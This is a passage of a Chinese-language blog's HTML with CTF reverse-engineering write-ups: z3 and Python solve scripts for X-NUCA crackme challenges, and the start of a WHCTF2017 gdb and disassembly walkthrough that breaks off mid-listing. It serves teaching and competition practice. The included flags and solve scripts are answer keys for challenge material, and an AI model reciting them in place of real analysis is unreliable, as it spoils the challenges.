0x5fbcbdbd</span><br><span class="line">stack[1] = input[3]</span><br><span class="line">reg -= stack[1]</span><br><span class="line">ipi -= 1</span><br><span class="line">isture |= reg</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>要保证isture寄存器为0,故可以整理出三个方程,z3直接求解即可</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">x = BitVec(<span class="string">"x"</span>,<span class="number">32</span>)</span><br><span class="line">y = BitVec(<span class="string">"y"</span>,<span class="number">32</span>)</span><br><span class="line">z = BitVec(<span class="string">"z"</span>,<span class="number">32</span>)</span><br><span class="line">S = Solver()</span><br><span class="line">S.add((x &gt;&gt; <span class="number">4</span>) * <span class="number">21</span> - z == <span class="number">0x1d7ecc6b</span>)</span><br><span class="line">S.add((z &gt;&gt; <span class="number">8</span>) * <span class="number">3</span> + y == <span class="number">0x6079797c</span>)</span><br><span class="line">S.add((x &gt;&gt; <span class="number">8</span>) + y == <span class="number">0x5fbcbdbd</span>)</span><br><span class="line">S.add(x &amp; <span class="number">0xff</span> == <span class="number">94</span>)</span><br><span class="line">S.add(z &amp; <span class="number">0xff</span> == <span class="number">94</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> S.check() == sat:</span><br><span class="line">    <span class="keyword">print</span> S.model()</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>将三个数字输入程序即可获得flag</li>
-</ul>
-<h1 id="Strange-Interpreter"><a href="#Strange-Interpreter" class="headerlink" title="Strange Interpreter"></a>Strange Interpreter</h1><ul>
-<li>很明显前面是个ollvm混淆,deflat没跑起来,这里采用手动调试来分析程序流程</li>
-<li>main函数非常的大,发现一开始在许多while里跳来跳去实际上是在执行stack[i] = input[i]的一个复制过程,然后进行i += 1,再检查下标和31的关系,也就是<code>for(i = 0;i &lt;=31; i++){stack[i] = input[i]}</code> </li>
-<li>随后就是在switch里的一大串运算,<code>input[i] = input[i - 1] (i =&gt; [32:48])</code>此类的运算过程,和这个类似的还有<code>- * ^</code>等运算</li>
-<li>继续调试找到和flag进行运算的地方,发现只是一个异或加密.而异或的数值,在之前的运算里也可以找到</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">stack</span>[index++] += <span class="number">104</span>;</span><br><span class="line">        reg1 = index;</span><br><span class="line">        reg2 = index;</span><br><span class="line">        <span class="built_in">stack</span>[index++] += <span class="number">28</span>;</span><br><span class="line">        reg1 = index;</span><br><span class="line">        reg2 = index;</span><br><span class="line">        <span class="built_in">stack</span>[index++] += <span class="number">124</span>;</span><br><span class="line">        reg1 = index;</span><br><span class="line">        reg2 = index;</span><br><span class="line">        <span class="built_in">stack</span>[index++] += <span class="number">102</span>;</span><br><span class="line">        reg1 = index;</span><br><span class="line">        reg2 = index;</span><br><span class="line">        <span class="built_in">stack</span>[index++] += <span class="number">119</span>;</span><br><span class="line">        reg1 = index;</span><br><span class="line">        reg2 = index;</span><br><span class="line">        <span class="built_in">stack</span>[index++] += <span class="number">116</span>;</span><br><span class="line">        reg1 = index;</span><br><span class="line">        reg2 = index;</span><br><span class="line">        <span class="built_in">stack</span>[index++] += <span class="number">26</span>;</span><br><span class="line">        reg1 = index;</span><br><span class="line">        reg2 = index;</span><br><span class="line">        <span class="built_in">stack</span>[index++] += <span class="number">87</span>;</span><br><span class="line">        reg1 = index;</span><br><span class="line">        reg2 = index;</span><br><span class="line">        <span class="built_in">stack</span>[index++] += <span class="number">6</span>;</span><br><span class="line">        reg1 = index;</span><br><span class="line">        reg2 = index;</span><br><span class="line">        <span class="built_in">stack</span>[index++] += <span class="number">83</span>;</span><br><span class="line">        reg1 = index;</span><br><span class="line">        reg2 = index;</span><br><span class="line">        <span class="built_in">stack</span>[index++] += <span class="number">82</span>;</span><br><span class="line">        reg1 = index;</span><br><span class="line">        reg2 = index;</span><br><span class="line">        <span class="built_in">stack</span>[index++] += <span class="number">83</span>;</span><br><span class="line">        reg1 = index;</span><br><span class="line">        reg2 = index;</span><br><span class="line">        <span class="built_in">stack</span>[index++] += <span class="number">2</span>;</span><br><span class="line">        reg1 = index;</span><br><span class="line">        reg2 = index;</span><br><span class="line">        <span class="built_in">stack</span>[index++] += <span class="number">93</span>;</span><br><span class="line">        reg1 = index;</span><br><span class="line">        reg2 = index;</span><br><span class="line">        <span class="built_in">stack</span>[index++] += <span class="number">12</span>;</span><br><span class="line">        reg1 = index;</span><br><span class="line">        reg2 = index;</span><br><span class="line">        <span class="built_in">stack</span>[index++] += <span class="number">93</span>;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>下面是加密部分</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">reg1 = index + 480;</span><br><span class="line">    stack[index] ^= stack[index + 480];</span><br><span class="line">    reg2 = ++index;</span><br><span class="line">    reg1 = index + 480;</span><br><span class="line">    stack[index] ^= stack[index + 480];</span><br><span class="line">    reg2 = ++index;</span><br><span class="line">    reg1 = index + 480;</span><br><span class="line">    stack[index] ^= stack[index + 480];</span><br><span class="line">    reg2 = ++index;</span><br><span class="line">    reg1 = index + 480;</span><br><span class="line">    stack[index] ^= stack[index + 480];</span><br><span class="line">    reg2 = ++index;</span><br><span class="line">    reg1 = index + 480;</span><br><span class="line">    stack[index] ^= stack[index + 480];</span><br><span class="line">    reg2 = ++index;</span><br><span class="line">    reg1 = index + 480;</span><br><span class="line">    stack[index] ^= stack[index + 480];</span><br><span class="line">    reg2 = ++index;</span><br><span class="line">    reg1 = index + 480;</span><br><span class="line">    stack[index] ^= stack[index + 480];</span><br><span class="line">    reg2 = ++index;</span><br><span class="line">    reg1 = index + 480;</span><br><span class="line">    stack[index] ^= stack[index + 480];</span><br><span class="line">    reg2 = ++index;</span><br><span class="line">    reg1 = index + 480;</span><br><span class="line">    stack[index] ^= stack[index + 480];</span><br><span class="line">    reg2 = ++index;</span><br><span class="line">    reg1 = index + 480;</span><br><span class="line">    stack[index] ^= stack[index + 480];</span><br><span class="line">    reg2 = ++index;</span><br><span class="line">    reg1 = index + 480;</span><br><span class="line">    stack[index] ^= stack[index + 480];</span><br><span class="line">    reg2 = ++index;</span><br><span class="line">    reg1 = index + 480;</span><br><span class="line">    stack[index] ^= stack[index + 480];</span><br><span class="line">    reg2 = ++index;</span><br><span class="line">    reg1 = index + 480;</span><br><span class="line">    stack[index] ^= stack[index + 480];</span><br><span class="line">    reg2 = ++index;</span><br><span class="line">    reg1 = index + 480;</span><br><span class="line">    stack[index] ^= stack[index + 480];</span><br><span class="line">    reg2 = ++index;</span><br><span class="line">    reg1 = index + 480;</span><br><span class="line">    stack[index] ^= stack[index + 480];</span><br><span class="line">    reg2 = ++index;</span><br><span class="line">    reg1 = index + 480;</span><br><span class="line">    stack[index] ^= stack[index + 480];</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>在这里patch内存的值都为零同样可以在程序中拿到异或所需要的key值,调试结束时可以看到程序将flagenc和一个”012345abcdefghijklmnopqrstuvwxyz”字符串数组进行逐位比较,这里可以异或求出前半段的flag值</li>
-<li>继续跟踪发现后续的操作全在switch case中,到最后可以调试到<code>stack[v18 + 16] ^= stack[v18 + 480] ^ stack[v18] ^ stack[v18 + 496]</code>,就是后16位的加密运算,直接写逆运算即可</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">table = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"012345abcdefghijklmnopqrstuvwxyz"</span>]</span><br><span class="line">key = [<span class="number">104</span>, <span class="number">28</span>, <span class="number">124</span>, <span class="number">102</span>, <span class="number">119</span>, <span class="number">116</span>, <span class="number">26</span>, <span class="number">87</span>, <span class="number">6</span>, <span class="number">83</span>, <span class="number">82</span>, <span class="number">83</span>, <span class="number">2</span>, <span class="number">93</span>, <span class="number">12</span>, <span class="number">93</span>, <span class="number">4</span>, <span class="number">116</span>, <span class="number">70</span>, <span class="number">14</span>, <span class="number">73</span>, <span class="number">6</span>, <span class="number">61</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">118</span>, <span class="number">39</span>, <span class="number">116</span>, <span class="number">37</span>, <span class="number">120</span>, <span class="number">121</span>, <span class="number">48</span>]</span><br><span class="line">flag = [<span class="number">0</span>] * <span class="number">32</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    flag[i]  = key[i] ^ table[i]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    flag[i + <span class="number">16</span>] = key[i] ^ key[i + <span class="number">16</span>] ^ table[i] ^ table[i + <span class="number">16</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">""</span>.join([chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> flag])</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>得到flag<code>X-NUCA{5e775e5e775e5e775e5e775e}</code></li>
-</ul>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/07/29/xnuca/" data-id="cjyn83qf3002dicthws1ya5fo" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-WHCTF2017 逆向签到题" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2019/07/29/WHCTF2017 逆向签到题/" class="article-date">
-  <time datetime="2019-07-28T17:11:01.833Z" itemprop="datePublished">2019-07-29</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/RE/">RE</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/07/29/WHCTF2017 逆向签到题/">CTF二进制总结0x01</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><strong>发现了一道大赛的签到题，来试一试下水</strong><br><br>大赛签到题次，ELF文件，扔进IDA，主函数逻辑很清晰，主要就是两个判断，一个是输入值的长度为14，二是将input传入一个judge函数，做判断。需要满足两个条件，由IDA反编译的结果来看，judge函数分析失败。这就很难受了，用gdb调试一波试试，顺便复习一下gdb操作。<br></p>
-<blockquote>
-<p>file BabyRE<br><br>set disassembly-flavor intel<br><br>b *0x400660<br><br>r<br><br>disassem /m</p>
-</blockquote>
-<p>得到如下结果</p>
-<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x40060</span>      	<span class="keyword">push</span>   <span class="built_in">rbp</span></span><br><span class="line"><span class="number">0x40060</span>      	<span class="keyword">mov</span>    <span class="built_in">rbp</span>,<span class="built_in">rsp</span></span><br><span class="line"><span class="number">0x40060</span>      	<span class="keyword">sub</span>    <span class="built_in">rsp</span>,<span class="number">0x20</span></span><br><span class="line"><span class="number">0x40060</span>      	<span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x4</span>],<span class="number">0x0</span></span><br><span class="line"><span class="number">0x400615</span>      	<span class="keyword">jmp</span>    <span class="number">0x400637</span> &lt;main+<span class="number">49</span>&gt;</span><br><span class="line"><span class="number">0x400617</span>      	<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x4</span>]</span><br><span class="line"><span class="number">0x40061a</span>      	<span class="keyword">cdqe</span>   </span><br><span class="line"><span class="number">0x40061c</span>      	<span class="keyword">movzx</span>  <span class="built_in">eax</span>,<span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rax</span>+<span class="number">0x600b00</span>]</span><br><span class="line"><span class="number">0x400623</span>      	<span class="keyword">xor</span>    <span class="built_in">eax</span>,<span class="number">0xc</span></span><br><span class="line"><span class="number">0x400626</span>      	<span class="keyword">mov</span>    <span class="built_in">edx</span>,<span class="built_in">eax</span></span><br><span class="line"><span class="number">0x400628</span>      	<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x4</span>]</span><br><span class="line"><span class="number">0x40062b</span>      	<span class="keyword">cdqe</span>   </span><br><span class="line"><span class="number">0x40062d</span>      	<span class="keyword">mov</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rax</span>+<span class="number">0x600b00</span>],<span class="built_in">dl</span></span><br><span class="line"><span class="number">0x400633</span>      	<span class="keyword">add</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x4</span>],<span class="number">0x1</span></span><br><span class="line"><span class="number">0x400637</span>      	<span class="keyword">cmp</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x4</span>],<span class="number">0xb5</span></span><br><span class="line"><span class="number">0x40063e</span>      	<span class="keyword">jle</span>    <span class="number">0x400617</span> &lt;main+<span class="number">17</span>&gt;</span><br><span class="line"><span class="number">0x400640</span>      	<span class="keyword">mov</span>    <span class="built_in">edi</span>,<span class="number">0x400734</span></span><br><span class="line"><span class="number">0x400645</span>      	<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x0</span></span><br><span class="line"><span class="number">0x40064a</span>      	<span class="keyword">call</span>   <span class="number">0x4004d0</span> &lt;printf@plt&gt;</span><br><span class="line"><span class="number">0x40064f</span>      	<span class="keyword">lea</span>    <span class="built_in">rax</span>,[<span class="built_in">rbp</span>-<span class="number">0x20</span>]</span><br><span class="line"><span class="number">0x400653</span>      	<span class="keyword">mov</span>    <span class="built_in">rsi</span>,<span class="built_in">rax</span></span><br><span class="line"><span class="number">0x400656</span>      	<span class="keyword">mov</span>    <span class="built_in">edi</span>,<span class="number">0x400747</span></span><br><span class="line"><span class="number">0x40065b</span>      	<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x0</span></span><br><span class="line"><span class="number">0x400660</span>      	<span class="keyword">call</span>   <span class="number">0x400500</span> &lt;__isoc99_scanf@plt&gt;</span><br><span class="line"><span class="number">0x400665</span>      	<span class="keyword">lea</span>    <span class="built_in">rax</span>,[<span class="built_in">rbp</span>-<span class="number">0x20</span>]</span><br><span class="line"><span class="number">0x400669</span>      	<span class="keyword">mov</span>    <span class="built_in">rdi</span>,<span class="built_in">rax</span></span><br><span class="line"><span class="number">0x40066c</span>       	<span class="keyword">call</span>   <span class="number">0x4004c0</span> &lt;strlen@plt&gt;</span><br><span class="line"><span class="number">0x400671</span>       	<span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x8</span>],<span class="built_in">eax</span></span><br><span class="line"><span class="number">0x400674</span>       	<span class="keyword">cmp</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x8</span>],<span class="number">0xe</span></span><br><span class="line"><span class="number">0x400678</span>       	<span class="keyword">jne</span>    <span class="number">0x400698</span> &lt;main+<span class="number">146</span>&gt;</span><br><span class="line"><span class="number">0x40067a</span>       	<span class="keyword">mov</span>    <span class="built_in">edx</span>,<span class="number">0x600b00</span></span><br><span class="line"><span class="number">0x40067f</span>       	<span class="keyword">lea</span>    <span class="built_in">rax</span>,[<span class="built_in">rbp</span>-<span class="number">0x20</span>]</span><br><span class="line"><span class="number">0x400683</span>       	<span class="keyword">mov</span>    <span class="built_in">rdi</span>,<span class="built_in">rax</span></span><br><span class="line"><span class="number">0x400686</span>       	<span class="keyword">call</span>   <span class="built_in">rdx</span></span><br><span class="line"><span class="number">0x400688</span>       	<span class="keyword">test</span>   <span class="built_in">eax</span>,<span class="built_in">eax</span></span><br><span class="line"><span class="number">0x40068a</span>       	<span class="keyword">je</span>     <span class="number">0x400698</span> &lt;main+<span class="number">146</span>&gt;</span><br><span class="line"><span class="number">0x40068c</span>       	<span class="keyword">mov</span>    <span class="built_in">edi</span>,<span class="number">0x40074c</span></span><br><span class="line"><span class="number">0x400691</span>       	<span class="keyword">call</span>   <span class="number">0x4004b0</span> &lt;puts@plt&gt;</span><br><span class="line"><span class="number">0x400696</span>       	<span class="keyword">jmp</span>    <span class="number">0x4006a2</span> &lt;main+<span class="number">156</span>&gt;</span><br><span class="line"><span class="number">0x400698</span>       	<span class="keyword">mov</span>    <span class="built_in">edi</span>,<span class="number">0x400753</span></span><br><span class="line"><span class="number">0x40069d</span>       	<span class="keyword">call</span>   <span class="number">0x4004b0</span> &lt;puts@plt&gt;</span><br><span class="line"><span class="number">0x4006a2</span>       	<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x0</span></span><br><span class="line"><span class="number">0x4006a7</span>       	<span class="keyword">leave</span>  </span><br><span class="line"><span class="number">0x4006a8</span>       	<span class="keyword">ret</span></span><br></pre></td></tr></table></figure>
-
-<p>可以看到，在 0x40067a 前，调用了一次strlen函数并且与0xe做了一次比较。在 0x40067a 处，调用了一次0x600b00，这应该就是我们要找的judge函数了，继续分析<br></p>
-<blockquote>
-<p>b *0x600b00<br><br>c</p>
-</blockquote>
-<p>终于获取到judge函数的汇编了，怼汇编吧。(&lt;\+[0-9]{0,2}正则替换一波格式，手动改真鸡儿慢)</p>
-<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x600b00</span>  <span class="keyword">pop</span>    <span class="built_in">rcx</span></span><br><span class="line"><span class="number">0x600b01</span>  <span class="keyword">mov</span>    <span class="built_in">rbp</span>,<span class="built_in">rsp</span></span><br><span class="line"><span class="number">0x600b04</span>  <span class="keyword">mov</span>    <span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x28</span>],<span class="built_in">rdi</span></span><br><span class="line"><span class="number">0x600b08</span>  <span class="keyword">mov</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x20</span>],<span class="number">0x66</span></span><br><span class="line"><span class="number">0x600b0c</span>  <span class="keyword">mov</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x1f</span>],<span class="number">0x6d</span></span><br><span class="line"><span class="number">0x600b10</span>  <span class="keyword">mov</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x1e</span>],<span class="number">0x63</span></span><br><span class="line"><span class="number">0x600b14</span>  <span class="keyword">mov</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x1d</span>],<span class="number">0x64</span></span><br><span class="line"><span class="number">0x600b18</span>  <span class="keyword">mov</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x1c</span>],<span class="number">0x7f</span></span><br><span class="line"><span class="number">0x600b1c</span>  <span class="keyword">mov</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x1b</span>],<span class="number">0x6b</span></span><br><span class="line"><span class="number">0x600b20</span>  <span class="keyword">mov</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x1a</span>],<span class="number">0x37</span></span><br><span class="line"><span class="number">0x600b24</span>  <span class="keyword">mov</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x19</span>],<span class="number">0x64</span></span><br><span class="line"><span class="number">0x600b28</span>  <span class="keyword">mov</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x18</span>],<span class="number">0x3b</span></span><br><span class="line"><span class="number">0x600b2c</span>  <span class="keyword">mov</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x17</span>],<span class="number">0x56</span></span><br><span class="line"><span class="number">0x600b30</span>  <span class="keyword">mov</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x16</span>],<span class="number">0x60</span></span><br><span class="line"><span class="number">0x600b34</span>  <span class="keyword">mov</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x15</span>],<span class="number">0x3b</span></span><br><span class="line"><span class="number">0x600b38</span>  <span class="keyword">mov</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x14</span>],<span class="number">0x6e</span></span><br><span class="line"><span class="number">0x600b3c</span>  <span class="keyword">mov</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x13</span>],<span class="number">0x70</span></span><br><span class="line"><span class="number">0x600b40</span>  <span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x4</span>],<span class="number">0x0</span></span><br><span class="line"><span class="number">0x600b47</span>  <span class="keyword">jmp</span>    <span class="number">0x600b71</span> &lt;judge+<span class="number">113</span>&gt;</span><br><span class="line"><span class="number">0x600b49</span>  <span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x4</span>]</span><br><span class="line"><span class="number">0x600b4c</span>  <span class="keyword">movsxd</span> <span class="built_in">rdx</span>,<span class="built_in">eax</span></span><br><span class="line"><span class="number">0x600b4f</span>  <span class="keyword">mov</span>    <span class="built_in">rax</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x28</span>]</span><br><span class="line"><span class="number">0x600b53</span>  <span class="keyword">add</span>    <span class="built_in">rax</span>,<span class="built_in">rdx</span></span><br><span class="line"><span class="number">0x600b56</span>  <span class="keyword">mov</span>    <span class="built_in">edx</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x4</span>]</span><br><span class="line"><span class="number">0x600b59</span>  <span class="keyword">movsxd</span> <span class="built_in">rcx</span>,<span class="built_in">edx</span></span><br><span class="line"><span class="number">0x600b5c</span>  <span class="keyword">mov</span>    <span class="built_in">rdx</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x28</span>]</span><br><span class="line"><span class="number">0x600b60</span>  <span class="keyword">add</span>    <span class="built_in">rdx</span>,<span class="built_in">rcx</span></span><br><span class="line"><span class="number">0x600b63</span>  <span class="keyword">movzx</span>  <span class="built_in">edx</span>,<span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rdx</span>]</span><br><span class="line"><span class="number">0x600b66</span>  <span class="keyword">mov</span>    <span class="built_in">ecx</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x4</span>]</span><br><span class="line"><span class="number">0x600b69</span>  <span class="keyword">xor</span>    <span class="built_in">edx</span>,<span class="built_in">ecx</span></span><br><span class="line"><span class="number">0x600b6b</span>  <span class="keyword">mov</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rax</span>],<span class="built_in">dl</span></span><br><span class="line"><span class="number">0x600b6d</span>  <span class="keyword">add</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x4</span>],<span class="number">0x1</span></span><br><span class="line"><span class="number">0x600b71</span>  <span class="keyword">cmp</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x4</span>],<span class="number">0xd</span></span><br><span class="line"><span class="number">0x600b75</span>  <span class="keyword">jle</span>    <span class="number">0x600b49</span> &lt;judge+<span class="number">73</span>&gt;</span><br><span class="line"><span class="number">0x600b77</span>  <span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x4</span>],<span class="number">0x0</span></span><br><span class="line"><span class="number">0x600b7e</span>  <span class="keyword">jmp</span>    <span class="number">0x600ba9</span> &lt;judge+<span class="number">169</span>&gt;</span><br><span class="line"><span class="number">0x600b80</span>  <span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x4</span>]</span><br><span class="line"><span class="number">0x600b83</span>  <span 